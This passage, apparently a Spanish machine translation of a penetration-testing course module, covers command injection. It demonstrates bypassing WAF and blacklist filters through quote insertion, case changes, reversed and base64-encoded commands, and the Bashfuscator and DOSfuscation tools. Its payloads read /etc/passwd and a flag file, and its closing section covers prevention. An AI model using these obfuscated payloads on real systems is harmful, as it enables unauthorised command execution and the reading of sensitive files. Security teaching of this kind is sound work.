Existen otras técnicas para producir los caracteres requeridos sin usarlos, como `shifting characters`. Por ejemplo, el siguiente comando de Linux cambia el carácter que pasamos `1`. Entonces, todo lo que tenemos que hacer es encontrar el personaje en la tabla ASCII que está justo antes de nuestro personaje necesario (podemos obtenerlo `man ascii`), luego agréguelo en lugar de `[` en el siguiente ejemplo. De esta manera, el último personaje impreso sería el que necesitamos:

  Bypassing Otros Personajes de la Lista Negra

```shell-session
vcrdcr@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
vcrdcr@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

Podemos usar comandos de PowerShell para lograr el mismo resultado en Windows, aunque pueden ser bastante más largos que los de Linux.

Ejercicio: Trate de utilizar la técnica de cambio de caracteres para producir un punto y coma `;` carácter. Primero encuentre el carácter antes que él en la tabla ascii, y luego úselo en el comando anterior.


# Eludir los comandos de la Lista Negra

---

Hemos discutido varios métodos para eludir los filtros de un solo carácter. Sin embargo, existen diferentes métodos cuando se trata de omitir los comandos de la lista negra. Una lista negra de comandos generalmente consiste en un conjunto de palabras, y si podemos ofuscar nuestros comandos y hacer que se vean diferentes, es posible que podamos omitir los filtros.

Hay varios métodos de ofuscación de comandos que varían en complejidad, como tocaremos más adelante con las herramientas de ofuscación de comandos. Cubriremos algunas técnicas básicas que pueden permitirnos cambiar el aspecto de nuestro comando para evitar los filtros manualmente.

---

## Lista negra de comandos

Hasta ahora hemos pasado por alto con éxito el filtro de caracteres para los caracteres de espacio y semi-colon en nuestra carga útil. Entonces, volvamos a nuestra primera carga útil y volvamos a agregar el `whoami` comando para ver si se ejecuta: ![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y una carga útil que contiene un intento de inyección de comandos. La sección de respuesta muestra el código HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra 'Introducción no válida' como resultado.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_1.jpg)

Vemos que a pesar de que usamos caracteres que no están bloqueados por la aplicación web, la solicitud se bloquea de nuevo una vez que agregamos nuestro comando. Esto probablemente se deba a otro tipo de filtro, que es un filtro de lista negra de comandos.

Un filtro de lista negra de comandos básicos en `PHP` se vería como el siguiente:

Código: php

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

Como podemos ver, está comprobando cada palabra de la entrada del usuario para ver si coincide con alguna de las palabras de la lista negra. Sin embargo, este código está buscando una coincidencia exacta del comando proporcionado, por lo que si enviamos un comando ligeramente diferente, es posible que no se bloquee. Afortunadamente, podemos utilizar varias técnicas de ofuscación que ejecutarán nuestro comando sin usar la palabra de comando exacta.

---

## Linux y Windows

Una técnica de ofuscación muy común y fácil es insertar ciertos caracteres dentro de nuestro comando que generalmente son ignorados por los shells de comandos como `Bash` o `PowerShell` y ejecutará el mismo comando que si no estuvieran allí. Algunos de estos personajes son una cita única `'` y una doble cita `"`, además de algunos otros.

Los más fáciles de usar son las citas, y funcionan tanto en servidores Linux como en Windows. Por ejemplo, si queremos ofuscar el `whoami` comando, podemos insertar comillas individuales entre sus caracteres, de la siguiente manera:

  Eludir los comandos de la Lista Negra

```shell-session
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```

Lo mismo funciona con citas dobles también:

  Eludir los comandos de la Lista Negra

```shell-session
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

Las cosas importantes para recordar son eso `we cannot mix types of quotes` y `the number of quotes must be even`. Podemos probar uno de los anteriores en nuestra carga útil (`127.0.0.1%0aw'h'o'am'i`) y ver si funciona:

#### Solicitud de Burp POST

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comandos. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra los resultados de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_2.jpg)

Como podemos ver, este método realmente funciona.

---

## Solo Linux

Podemos insertar algunos otros caracteres solo para Linux en medio de comandos, y el `bash` shell los ignoraría y ejecutaría el comando. Estos personajes incluyen la reacción inversa `\` y el carácter de parámetro posicional `$@`. Esto funciona exactamente como lo hizo con las citas, pero en este caso, `the number of characters do not have to be even`, y podemos insertar solo uno de ellos si queremos:

Código: bash

```bash
who$@ami
w\ho\am\i
```

Ejercicio: Pruebe los dos ejemplos anteriores en su carga útil y vea si funcionan para omitir el filtro de comandos. Si no lo hacen, esto puede indicar que puede haber usado un carácter filtrado. ¿Podría evitar eso también, utilizando las técnicas que aprendimos en la sección anterior?

---

## Solo Windows

También hay algunos caracteres solo para Windows que podemos insertar en medio de comandos que no afectan el resultado, como un caret (`^`) carácter, como podemos ver en el siguiente ejemplo:

  Eludir los comandos de la Lista Negra

```cmd-session
C:\htb> who^ami

21y4d
```

En la siguiente sección, discutiremos algunas técnicas más avanzadas para la ofuscación de comandos y el desvío de filtros.


# Ofuscación Avanzada de Comando

---

En algunos casos, podemos estar tratando con soluciones de filtrado avanzadas, como Web Application Firewalls (WAF), y las técnicas básicas de evasión pueden no funcionar necesariamente. Podemos utilizar técnicas más avanzadas para tales ocasiones, lo que hace que la detección de los comandos inyectados sea mucho menos probable.

---

## Manipulación de Casos

Una técnica de ofuscación de comandos que podemos usar es la manipulación de casos, como invertir los casos de caracteres de un comando (por ejemplo. `WHOAMI`) o alternando entre casos (p. ej. `WhOaMi`). Esto generalmente funciona porque una lista negra de comandos puede no verificar diferentes variaciones de casos de una sola palabra, ya que los sistemas Linux son sensibles a casos.

Si estamos tratando con un servidor Windows, podemos cambiar la carcasa de los caracteres del comando y enviarlo. En Windows, los comandos para PowerShell y CMD son insensibles a los casos, lo que significa que ejecutarán el comando independientemente del caso en el que esté escrito:

  Ofuscación Avanzada de Comando

```powershell-session
PS C:\htb> WhOaMi

21y4d
```

Sin embargo, cuando se trata de Linux y un shell bash, que son sensibles a los casos, como se mencionó anteriormente, tenemos que ser un poco creativos y encontrar un comando que convierta el comando en una palabra de mayúsculas y minúsculas. Un comando de trabajo que podemos usar es el siguiente:

  Ofuscación Avanzada de Comando

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

Como podemos ver, el comando funcionó, a pesar de que la palabra que proporcionamos fue (`WhOaMi`). Este comando utiliza `tr` para reemplazar todos los caracteres en mayúsculas con caracteres en minúsculas, lo que da como resultado un comando de caracteres en minúsculas. Sin embargo, si intentamos usar el comando anterior con el `Host Checker` aplicación web, veremos que todavía se bloquea:

#### Solicitud de Burp POST

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comandos. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra 'Introducción no válida' como resultado.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_3.jpg)

`Can you guess why?` Es porque el comando anterior contiene espacios, que es un carácter filtrado en nuestra aplicación web, como hemos visto antes. Entonces, con tales técnicas, `we must always be sure not to use any filtered characters`, de lo contrario nuestras solicitudes fallarán, y podemos pensar que las técnicas no funcionaron.

Una vez que reemplazamos los espacios con pestañas (`%09`), vemos que el comando funciona perfectamente:

#### Solicitud de Burp POST

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comandos. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra los resultados de ping para 127.0.0.1 con el usuario 'www-data'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_4.jpg)

Hay muchos otros comandos que podemos usar para el mismo propósito, como los siguientes:

Código: bash

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

Ejercicio: ¿Puede probar el comando anterior para ver si funciona en su VM Linux y luego tratar de evitar el uso de caracteres filtrados para que funcione en la aplicación web?

---

## Comandos Invertidos

Otra técnica de ofuscación de comandos que discutiremos es revertir los comandos y tener una plantilla de comandos que los cambie y los ejecute en tiempo real. En este caso, estaremos escribiendo `imaohw` en lugar de `whoami` para evitar activar el comando de la lista negra.

Podemos ser creativos con tales técnicas y crear nuestros propios comandos de Linux/Windows que eventualmente ejecutan el comando sin contener las palabras de comando reales. Primero, tendríamos que obtener la cadena invertida de nuestro comando en nuestro terminal, de la siguiente manera:

  Ofuscación Avanzada de Comando

```shell-session
vcrdcr@htb[/htb]$ echo 'whoami' | rev
imaohw
```

Luego, podemos ejecutar el comando original revirtiéndolo en una sub-shell (`$()`), de la siguiente manera:

  Ofuscación Avanzada de Comando

```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

Vemos que a pesar de que el comando no contiene lo real `whoami` palabra, funciona igual y proporciona la salida esperada. También podemos probar este comando con nuestro ejercicio, y de hecho funciona:

#### Solicitud de Burp POST

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comandos. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra los resultados de ping para 127.0.0.1 con el usuario 'www-data'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_5.jpg)

Consejo: Si desea omitir un filtro de caracteres con el método anterior, también tendría que revertirlos o incluirlos al invertir el comando original.

Lo mismo se puede aplicar en `Windows.` Primero podemos revertir una cadena, de la siguiente manera:

  Ofuscación Avanzada de Comando

```powershell-session
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

Ahora podemos usar el siguiente comando para ejecutar una cadena invertida con una sub-shell de PowerShell (`iex "$()"`), como sigue:

  Ofuscación Avanzada de Comando

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

---

## Comandos Codificados

La técnica final que discutiremos es útil para los comandos que contienen caracteres filtrados o caracteres que pueden ser decodificados por URL por el servidor. Esto puede permitir que el comando se arruine cuando llegue al shell y finalmente no se ejecute. En lugar de copiar un comando existente en línea, intentaremos crear nuestro propio comando de ofuscación único esta vez. De esta manera, es mucho menos probable que sea denegado por un filtro o un WAF. El comando que creamos será único para cada caso, dependiendo de qué caracteres están permitidos y el nivel de seguridad en el servidor.

Podemos utilizar varias herramientas de codificación, como `base64` (para la codificación b64) o `xxd` (para codificación hexadecimal). Tomemos `base64` como ejemplo. Primero, codificaremos la carga útil que queremos ejecutar (que incluye caracteres filtrados):

  Ofuscación Avanzada de Comando

```shell-session
vcrdcr@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Ahora podemos crear un comando que decodificará la cadena codificada en una sub-shell (`$()`), y luego pasarlo a `bash` para ser ejecutado (es decir. `bash<<<`), de la siguiente manera:

  Ofuscación Avanzada de Comando

```shell-session
vcrdcr@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Como podemos ver, el comando anterior ejecuta el comando perfectamente. No incluimos ningún carácter filtrado y evitamos los caracteres codificados que pueden hacer que el comando no se ejecute.

Consejo: Tenga en cuenta que estamos utilizando `<<<` para evitar usar una tubería `|`, que es un carácter filtrado.

Ahora podemos usar este comando (una vez que reemplazamos los espacios) para ejecutar el mismo comando a través de la inyección de comandos:

#### Solicitud de Burp POST

![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a 127.0.0.1 con encabezados y un intento de inyección de comandos utilizando la decodificación base64. La sección de respuesta muestra HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra los resultados de ping para 127.0.0.1 con el usuario 'www-data' e información adicional del usuario.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_6.jpg)

Incluso si algunos comandos fueron filtrados, como `bash` o `base64`éste podría evitarse con las técnicas que discutimos en la sección anterior (por ejemplo, inserción de caracteres), o usar otras alternativas como `sh` para la ejecución de comandos y `openssl` para la decodificación b64, o `xxd` para decodificación hexadecimal.

También usamos la misma técnica con Windows. Primero, necesitamos que base64 codifique nuestra cadena, de la siguiente manera:

  Ofuscación Avanzada de Comando

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

También podemos lograr lo mismo en Linux, pero tendríamos que convertir la cadena de `utf-8` a `utf-16` antes que nosotros `base64` es, como sigue:

  Ofuscación Avanzada de Comando

```shell-session
vcrdcr@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Finalmente, podemos decodificar la cadena b64 y ejecutarla con una sub-corteza PowerShell (`iex "$()"`), como sigue:

  Ofuscación Avanzada de Comando

```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

Como podemos ver, podemos ser creativos con `Bash` o `PowerShell` y cree nuevos métodos de derivación y ofuscación que no se hayan utilizado antes, y por lo tanto es muy probable que omitan filtros y WAF. Varias herramientas pueden ayudarnos a ofuscar automáticamente nuestros comandos, que discutiremos en la siguiente sección.

Además de las técnicas que discutimos, podemos utilizar muchos otros métodos, como comodines, regex, redirección de salida, expansión de enteros y muchos otros. Podemos encontrar algunas de estas técnicas en [Cargas útilesAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).


# Herramientas de Evasión

---

Si estamos tratando con herramientas de seguridad avanzadas, es posible que no podamos usar técnicas básicas de ofuscación manual. En tales casos, puede ser mejor recurrir a herramientas de ofuscación automatizadas. Esta sección discutirá un par de ejemplos de este tipo de herramientas, una para `Linux` y otro para `Windows.`

---

## Linux (Bashfuscador)

Una herramienta útil que podemos utilizar para ofuscar comandos bash es [Bashfuscador](https://github.com/Bashfuscator/Bashfuscator). Podemos clonar el repositorio de GitHub y luego instalar sus requisitos, de la siguiente manera:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
vcrdcr@htb[/htb]$ cd Bashfuscator
vcrdcr@htb[/htb]$ pip3 install setuptools==65
vcrdcr@htb[/htb]$ python3 setup.py install --user
```

Una vez que tengamos la herramienta configurada, podemos comenzar a usarla desde el `./bashfuscator/bin/` directorio. Hay muchas banderas que podemos usar con la herramienta para afinar nuestro comando final ofuscado, como podemos ver en el `-h` menú de ayuda:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ cd ./bashfuscator/bin/
vcrdcr@htb[/htb]$ ./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

Podemos comenzar simplemente proporcionando el comando que queremos ofuscar con el `-c` bandera:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

¡Sin embargo, ejecutar la herramienta de esta manera elegirá aleatoriamente una técnica de ofuscación, que puede generar una longitud de comando que va desde unos pocos cientos de caracteres hasta más de un millón de caracteres! Por lo tanto, podemos usar algunas de las banderas del menú de ayuda para producir un comando ofuscado más corto y simple, de la siguiente manera:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

Ahora podemos probar el comando emitido con `bash -c ''`, para ver si ejecuta el comando previsto:

  Herramientas de Evasión

```shell-session
vcrdcr@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

Podemos ver que el comando ofuscado funciona, todo mientras se ve completamente ofuscado, y no se parece a nuestro comando original. También podemos notar que la herramienta utiliza muchas técnicas de ofuscación, incluidas las que discutimos anteriormente y muchas otras.

Ejercicio: Intente probar el comando anterior con nuestra aplicación web, para ver si puede omitir con éxito los filtros. Si no es así, ¿puedes adivinar por qué? ¿Y puede hacer que la herramienta produzca una carga útil de trabajo?

---

## Windows (DOSfuscación)

También hay una herramienta muy similar que podemos usar para Windows llamada [DOSfuscación](https://github.com/danielbohannon/Invoke-DOSfuscation). A diferencia `Bashfuscator`ésta es una herramienta interactiva, ya que la ejecutamos una vez e interactuamos con ella para obtener el comando ofuscado deseado. Una vez más podemos clonar la herramienta de GitHub y luego invocarla a través de PowerShell, de la siguiente manera:

  Herramientas de Evasión

```powershell-session
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

Incluso podemos usar `tutorial` para ver un ejemplo de cómo funciona la herramienta. Una vez que estamos configurados, podemos comenzar a usar la herramienta, de la siguiente manera:

  Herramientas de Evasión

```powershell-session
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

Finalmente, podemos intentar ejecutar el comando ofuscado `CMD`y vemos que realmente funciona como se esperaba:

  Herramientas de Evasión

```cmd-session
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

Consejo: Si no tenemos acceso a una VM de Windows, podemos ejecutar el código anterior en una VM de Linux a través de `pwsh`. Correr `pwsh`y luego siga exactamente el mismo comando desde arriba. Esta herramienta está instalada de forma predeterminada en su instancia de 'pwnboxory. También puede encontrar instrucciones de instalación en este [enlace](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).

Para obtener más información sobre los métodos avanzados de ofuscación, puede consultar el [Codificación segura 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) módulo, que cubre métodos avanzados de ofuscación que se pueden utilizar en varios ataques, incluidos los que cubrimos en este módulo.


# Prevención de Inyección de Comando

---

Ahora deberíamos tener una comprensión sólida de cómo ocurren las vulnerabilidades de inyección de comandos y cómo se pueden omitir ciertas mitigaciones como los filtros de caracteres y comandos. Esta sección discutirá los métodos que podemos usar para prevenir las vulnerabilidades de inyección de comandos en nuestras aplicaciones web y configurar correctamente el servidor web para evitarlas.

---

## Comandos del Sistema

Siempre debemos evitar el uso de funciones que ejecutan comandos del sistema, especialmente si estamos utilizando la entrada del usuario con ellos. Incluso cuando no estamos ingresando directamente la entrada del usuario en estas funciones, un usuario puede influir indirectamente en ellas, lo que eventualmente puede conducir a una vulnerabilidad de inyección de comandos.

En lugar de utilizar funciones de ejecución de comandos del sistema, deberíamos usar funciones integradas que realicen la funcionalidad necesaria, ya que los lenguajes de back-end generalmente tienen implementaciones seguras de este tipo de funcionalidades. Por ejemplo, supongamos que queríamos probar si un host en particular está vivo con `PHP`. En ese caso, podemos usar el `fsockopen` función en su lugar, que no debe ser explotable para ejecutar comandos arbitrarios del sistema.

Si necesitábamos ejecutar un comando del sistema, y no se puede encontrar ninguna función incorporada para realizar la misma funcionalidad, nunca debemos usar directamente la entrada del usuario con estas funciones, sino que siempre debemos validar y desinfectar la entrada del usuario en el back-end. Además, debemos tratar de limitar nuestro uso de este tipo de funciones tanto como sea posible y solo usarlas cuando no haya una alternativa incorporada a la funcionalidad que requerimos.

---

## Validación de Entrada

Ya sea utilizando funciones integradas o funciones de ejecución de comandos del sistema, siempre debemos validar y luego desinfectar la entrada del usuario. La validación de entrada se realiza para garantizar que coincida con el formato esperado para la entrada, de modo que la solicitud se deniegue si no coincide. En nuestra aplicación web de ejemplo, vimos que hubo un intento de validación de entrada en el front-end, pero `input validation should be done both on the front-end and on the back-end`.

En `PHP`, al igual que muchos otros lenguajes de desarrollo web, hay filtros integrados para una variedad de formatos estándar, como correos electrónicos, URL e incluso IP, que se pueden usar con `filter_var` función, de la siguiente manera:

Código: php

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

Si quisiéramos validar un formato no estándar diferente, entonces podemos usar una Expresión Regular `regex` con el `preg_match` función. Lo mismo se puede lograr con `JavaScript` tanto para el front-end como para el back-end (es decir. `NodeJS`), como sigue:

Código: javascript

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

Igual que `PHP`, con `NodeJS`, también podemos usar bibliotecas para validar varios formatos estándar, como [is-ip](https://www.npmjs.com/package/is-ip) por ejemplo, con el que podemos instalar `npm`y luego usa el `isIp(ip)` función en nuestro código. Puede leer los manuales de otros idiomas, como [.NETO](https://learn.microsoft.com/en-us/aspnet/web-pages/overview/ui-layouts-and-themes/validating-user-input-in-aspnet-web-pages-sites) o [Java](https://docs.oracle.com/cd/E13226_01/workshop/docs81/doc/en/workshop/guide/netui/guide/conValidatingUserInput.html?skipReload=true), para averiguar cómo validar la entrada del usuario en cada idioma respectivo.

---

## Desinfección de Entrada

La parte más crítica para prevenir cualquier vulnerabilidad de inyección es la desinfección de entrada, lo que significa eliminar cualquier carácter especial no necesario de la entrada del usuario. La desinfección de entrada siempre se realiza después de la validación de entrada. Incluso después de validar que la entrada del usuario proporcionada está en el formato adecuado, aún debemos realizar la desinfección y eliminar cualquier carácter especial que no sea necesario para el formato específico, ya que hay casos en los que la validación de entrada puede fallar (por ejemplo, un bad regex).

En nuestro código de ejemplo, vimos que cuando estábamos tratando con filtros de caracteres y comandos, estaba en la lista negra de ciertas palabras y buscándolas en la entrada del usuario. En general, este no es un enfoque lo suficientemente bueno para prevenir las inyecciones, y debemos usar funciones integradas para eliminar cualquier carácter especial. Podemos usar `preg_replace` para eliminar cualquier carácter especial de la entrada del usuario, de la siguiente manera:

Código: php

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

Como podemos ver, el regex anterior solo permite caracteres alfanuméricos (`A-Za-z0-9`) y permite un carácter de punto (`.`) según sea necesario para IPs. Cualquier otro carácter se eliminará de la cadena. Lo mismo se puede hacer con `JavaScript`, como sigue:

Código: javascript

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

También podemos utilizar la biblioteca DOMPurify para `NodeJS` back-end, de la siguiente manera:

Código: javascript

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

En ciertos casos, es posible que deseemos permitir todos los caracteres especiales (por ejemplo, comentarios de usuario), luego podemos usar el mismo `filter_var` función que utilizamos con validación de entrada, y utilizar el `escapeshellcmd` filtre para escapar de cualquier carácter especial, por lo que no pueden causar ninguna inyección. Para `NodeJS`, simplemente podemos usar el `escape(ip)` función. `However, as we have seen in this module, escaping special characters is usually not considered a secure practice, as it can often be bypassed through various techniques`.

Para obtener más información sobre la validación y desinfección de la entrada del usuario para evitar inyecciones de comandos, puede consultar el [Codificación segura 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) módulo, que cubre cómo auditar el código fuente de una aplicación web para identificar vulnerabilidades de inyección de comandos, y luego funciona para parchear correctamente este tipo de vulnerabilidades.

---

## Configuración del Servidor

Finalmente, debemos asegurarnos de que nuestro servidor de back-end esté configurado de forma segura para reducir el impacto en caso de que el servidor web se vea comprometido. Algunas de las configuraciones que podemos implementar son:

- Utilice el Firewall de aplicaciones Web incorporado del servidor web (por ejemplo, en Apache `mod_security`), además de un WAF externo (p. ej. `Cloudflare`, `Fortinet`, `Imperva`..)
    
- Cumple con el [Principio de Menor Privilegio (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) al ejecutar el servidor web como un usuario con bajo privilegio (por ejemplo. `www-data`)
    
- Evitar que ciertas funciones sean ejecutadas por el servidor web (por ejemplo, en PHP `disable_functions=system,...`)
    
- Limite el alcance accesible por la aplicación web a su carpeta (por ejemplo, en PHP `open_basedir = '/var/www/html'`)
    
- Rechazar solicitudes de doble codificación y caracteres no ASCII en las URL
    
- Evitar el uso de bibliotecas y módulos sensibles/anticuados (p. ej. [CGI PHP](https://www.php.net/manual/en/install.unix.commandline.php))
    

Al final, incluso después de todas estas mitigaciones y configuraciones de seguridad, tenemos que realizar las técnicas de prueba de penetración que aprendimos en este módulo para ver si alguna funcionalidad de aplicación web aún puede ser vulnerable a la inyección de comandos. Como algunas aplicaciones web tienen millones de líneas de código, cualquier error en cualquier línea de código puede ser suficiente para introducir una vulnerabilidad. Por lo tanto, debemos tratar de proteger la aplicación web complementando las mejores prácticas de codificación segura con pruebas de penetración exhaustivas.


